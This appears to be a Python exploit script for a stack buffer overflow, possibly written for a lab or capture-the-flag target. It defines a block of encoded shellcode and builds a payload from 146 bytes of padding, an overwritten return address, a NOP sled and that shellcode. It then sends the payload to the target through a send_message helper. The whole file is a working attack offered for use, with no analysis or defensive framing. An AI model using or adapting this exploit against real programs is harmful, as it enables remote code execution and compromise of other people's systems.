from sender import send_message

shellcode = (
	"\xbe\xa7\x2f\x47\x15\xda\xd4\xd9\x74\x24\xf4\x5f\x33\xc9\xb1"
	"\x52\x83\xef\xfc\x31\x77\x0e\x03\xd0\x21\xa5\xe0\xe2\xd6\xab"
	"\x0b\x1a\x27\xcc\x82\xff\x16\xcc\xf1\x74\x08\xfc\x72\xd8\xa5"
	"\x77\xd6\xc8\x3e\xf5\xff\xff\xf7\xb0\xd9\xce\x08\xe8\x1a\x51"
	"\x8b\xf3\x4e\xb1\xb2\x3b\x83\xb0\xf3\x26\x6e\xe0\xac\x2d\xdd"
	"\x14\xd8\x78\xde\x9f\x92\x6d\x66\x7c\x62\x8f\x47\xd3\xf8\xd6"
	"\x47\xd2\x2d\x63\xce\xcc\x32\x4e\x98\x67\x80\x24\x1b\xa1\xd8"
	"\xc5\xb0\x8c\xd4\x37\xc8\xc9\xd3\xa7\xbf\x23\x20\x55\xb8\xf0"
	"\x5a\x81\x4d\xe2\xfd\x42\xf5\xce\xfc\x87\x60\x85\xf3\x6c\xe6"
	"\xc1\x17\x72\x2b\x7a\x23\xff\xca\xac\xa5\xbb\xe8\x68\xed\x18"
	"\x90\x29\x4b\xce\xad\x29\x34\xaf\x0b\x22\xd9\xa4\x21\x69\xb6"
	"\x09\x08\x91\x46\x06\x1b\xe2\x74\x89\xb7\x6c\x35\x42\x1e\x6b"
	"\x3a\x79\xe6\xe3\xc5\x82\x17\x2a\x02\xd6\x47\x44\xa3\x57\x0c"
	"\x94\x4c\x82\x83\xc4\xe2\x7d\x64\xb4\x42\x2e\x0c\xde\x4c\x11"
	"\x2c\xe1\x86\x3a\xc7\x18\x41\x85\xb0\x22\xfd\x6d\xc3\x22\xfc"
	"\xd6\x4a\xc4\x94\x38\x1b\x5f\x01\xa0\x06\x2b\xb0\x2d\x9d\x56"
	"\xf2\xa6\x12\xa7\xbd\x4e\x5e\xbb\x2a\xbf\x15\xe1\xfd\xc0\x83"
	"\x8d\x62\x52\x48\x4d\xec\x4f\xc7\x1a\xb9\xbe\x1e\xce\x57\x98"
	"\x88\xec\xa5\x7c\xf2\xb4\x71\xbd\xfd\x35\xf7\xf9\xd9\x25\xc1"
	"\x02\x66\x11\x9d\x54\x30\xcf\x5b\x0f\xf2\xb9\x35\xfc\x5c\x2d"
	"\xc3\xce\x5e\x2b\xcc\x1a\x29\xd3\x7d\xf3\x6c\xec\xb2\x93\x78"
	"\x95\xae\x03\x86\x4c\x6b\x33\xcd\xcc\xda\xdc\x88\x85\x5e\x81"
	"\x2a\x70\x9c\xbc\xa8\x70\x5d\x3b\xb0\xf1\x58\x07\x76\xea\x10"
	"\x18\x13\x0c\x86\x19\x36"
)

# '\xbf\x16\x04\x08'
# '\xc3\x14\x04\x08'
# Build a happy little message folloewd by a newline
buf = 'A'*146 + '\xbf\x16\x04\x08' + '\x90'*16 + shellcode
buf += 'Python Script'
buf += '\n'

send_message(buf)